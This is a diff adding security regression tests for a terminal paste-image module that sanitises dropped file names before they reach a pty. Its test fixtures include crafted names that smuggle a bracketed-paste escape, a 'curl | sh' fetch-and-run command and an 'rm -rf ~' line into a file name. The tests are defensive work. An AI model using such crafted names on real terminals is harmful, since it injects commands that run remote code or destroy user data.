@@ -1,5 +1,5 @@
 import { describe, it, expect, vi } from 'vitest'
-import { persistFiles, imageFilesFrom, bracketedPaste, isImagePath, writesForDroppedPaths } from './paste-image'
+import { persistFiles, imageFilesFrom, bracketedPaste, isImagePath, writesForDroppedPaths, ptyPath, pastePaths, safeExt } from './paste-image'
 
 // jsdom's File.arrayBuffer() doesn't reliably round-trip bytes, so use explicit
 // File-like stubs — this also lets us simulate an unreadable file deterministically.
@@ -108,5 +108,47 @@ describe('writesForDroppedPaths', () => {
 
   it('writes nothing for nothing', () => {
     expect(writesForDroppedPaths([])).toEqual([])
+  })
+})
+
+// Security review 2026-10-02, R4: a dropped file's name reaches the pty, so a name that carries
+// `ESC[201~` must not end the paste, and its extension must not carry anything into the temp path.
+describe('dropped names never carry control characters into the pty', () => {
+  const crafted = '/tmp/x\x1b[201~\x15!curl -s h|sh\r.png'
+
+  it('ptyPath removes control characters, line breaks and tabs', () => {
+    expect(ptyPath(crafted)).toBe('/tmp/x[201~!curl -s h|sh.png')
+    expect(ptyPath('/tmp/a\nb\tc\x9b201~.txt')).toBe('/tmp/abc201~.txt')
+    expect(ptyPath('/tmp/Screenshot 2026-08-21 at 8.59.45 PM.png')).toBe('/tmp/Screenshot 2026-08-21 at 8.59.45 PM.png')
+  })
+
+  it('pastePaths holds exactly one paste terminator, its own', () => {
+    const out = pastePaths([crafted, '/tmp/b.png'])
+    expect(out).toBe('\x1b[200~/tmp/x[201~!curl -s h|sh.png /tmp/b.png\x1b[201~')
+    expect(out.split('\x1b').length - 1).toBe(2)
+  })
+
+  it('writesForDroppedPaths strips both the paste and the plain write', () => {
+    expect(writesForDroppedPaths([crafted])).toEqual(['\x1b[200~/tmp/x[201~!curl -s h|sh.png\x1b[201~'])
+    // In the plain write a newline would be Enter in a shell.
+    expect(writesForDroppedPaths(['/tmp/a\nrm -rf ~\n.txt'])).toEqual(["'/tmp/arm -rf ~.txt' "])
+    expect(writesForDroppedPaths(['\x1b\x15'])).toEqual([])
+  })
+
+  it('safeExt keeps 1-8 letters or digits, lowercased, and refuses anything else', () => {
+    expect(safeExt('PNG')).toBe('png')
+    expect(safeExt('.jpeg')).toBe('jpeg')
+    expect(safeExt('markdown')).toBe('markdown')
+    for (const bad of ['', 'png\x1b[201~', 'svg+xml', 'p g', 'png/../x', 'toolongext', '\u00e9']) {
+      expect(safeExt(bad), JSON.stringify(bad)).toBeNull()
+    }
+  })
+
+  it('persistFiles names the temp file with a safe extension only', async () => {
+    const save = vi.fn(async (_b64: string, ext: string) => `/tmp/p.${ext}`)
+    await persistFiles([fakeFile([0], 'shot.png\x1b[201~\x15', 'image/png')], save)
+    expect(save.mock.calls[0][1]).toBe('png') // the name's extension refused, the mime subtype used
+    await persistFiles([fakeFile([0], 'a.p\x1bng', 'image/svg+xml')], save)
+    expect(save.mock.calls[1][1]).toBe('png') // both refused, the default used
   })
 })
